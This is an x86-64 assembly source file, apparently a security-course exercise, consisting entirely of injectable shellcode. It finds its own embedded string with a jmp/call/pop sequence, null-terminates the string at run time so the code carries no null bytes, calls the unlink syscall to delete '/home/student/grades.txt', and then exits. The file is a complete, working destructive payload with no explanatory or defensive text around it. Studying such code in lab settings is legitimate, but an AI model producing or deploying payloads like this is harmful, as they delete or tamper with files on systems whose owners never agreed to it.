#include <sys/syscall.h>

#define STRING	"/home/student/grades.txt"
#define STRLEN	24

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popq	%rcx
	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb	%al,(STRLEN)(%rcx)	/* null-terminate our string */

	movb	$SYS_unlink,%al		/* set up the syscall number */
	movq	%rcx,%rdi		/* syscall arg 1: string pathname */
	syscall				/* invoke syscall */

	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb    $SYS_exit,%al		/* set up the syscall number */
	xorq	%rdi,%rdi		/* syscall arg 1: 0 */
	syscall				/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING
